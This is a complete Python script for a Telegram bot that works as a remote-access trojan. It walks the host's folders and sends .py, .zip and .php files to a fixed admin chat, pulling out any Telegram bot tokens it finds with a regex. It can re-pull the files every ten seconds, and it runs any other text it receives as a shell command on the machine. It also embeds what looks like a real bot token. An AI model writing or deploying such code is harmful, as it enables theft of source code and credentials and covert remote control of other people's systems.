import os
import re
import time
import threading
import telebot
import subprocess
import requests

BOT_TOKEN = "8193906441:AAHXgEf-hAu88-PNxxxTntnmGlEinqSH5Ac"
ADMIN_ID = 1353119625

bot = telebot.TeleBot(BOT_TOKEN)

watching = False
sent_files = set()
TOKEN_REGEX = r'\d{6,}:[A-Za-z0-9_-]{30,}'
scan_path = "."
current_path = os.getcwd()

def extract_tokens(filepath):
    try:
        if filepath.endswith(('.py', '.php')):
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                return re.findall(TOKEN_REGEX, content)
        return []
    except:
        return []

def send_file(filepath):
    if filepath in sent_files:
        return
    tokens = extract_tokens(filepath)
    caption = "[+] Token(s) Found:\n" + "\n".join(tokens) if tokens else "[!] No token found."
    try:
        with open(filepath, 'rb') as file:
            bot.send_document(ADMIN_ID, file, caption=caption)
        sent_files.add(filepath)
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error sending {filepath}: {str(e)}")

def scan_directory(path):
    for root, _, files in os.walk(path):
        for file in files:
            if file.endswith((".py", ".zip", ".php")):
                full_path = os.path.join(root, file)
                send_file(full_path)

def watch_directory(path):
    global watching
    while watching:
        scan_directory(path)
        time.sleep(10)

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.send_message(message.chat.id, "Bot is running. Send commands or use watch_on <path> / watch_off / pull <path> / cd <path>.")

@bot.message_handler(content_types=['text'])
def handle_commands(message):
    global scan_path, watching, current_path
    if message.from_user.id != ADMIN_ID:
        return

    command = message.text.strip()

    if command.startswith("watch_on"):
        parts = command.split(maxsplit=1)
        scan_path = parts[1] if len(parts) == 2 else "."
        if not watching:
            watching = True
            threading.Thread(target=watch_directory, args=(scan_path,), daemon=True).start()
            bot.reply_to(message, f"Watch mode activated for: {scan_path}")
        else:
            bot.reply_to(message, "Watch mode already active.")

    elif command.startswith("watch_off"):
        watching = False
        bot.reply_to(message, "Watch mode deactivated.")

    elif command.startswith("pull"):
        parts = command.split(maxsplit=1)
        scan_path = parts[1] if len(parts) == 2 else "."
        bot.reply_to(message, f"Pulling .py, .zip, and .php files from: {scan_path}")
        scan_directory(scan_path)

    elif command.startswith("cd "):
        path = command[3:].strip()
        full_path = os.path.abspath(os.path.join(current_path, path))
        if os.path.isdir(full_path):
            current_path = full_path
            bot.reply_to(message, f"Changed directory to: {current_path}")
        else:
            bot.reply_to(message, f"Directory not found: {full_path}")

    else:
        try:
            result = subprocess.check_output(command, shell=True, cwd=current_path, stderr=subprocess.STDOUT, text=True)
            bot.reply_to(message, result[:4000] or "Command executed successfully.")
        except subprocess.CalledProcessError as e:
            bot.reply_to(message, f"Error:\n{e.output[:4000]}")
        except Exception as e:
            bot.reply_to(message, f"Error executing command: {str(e)}")

bot.infinity_polling()
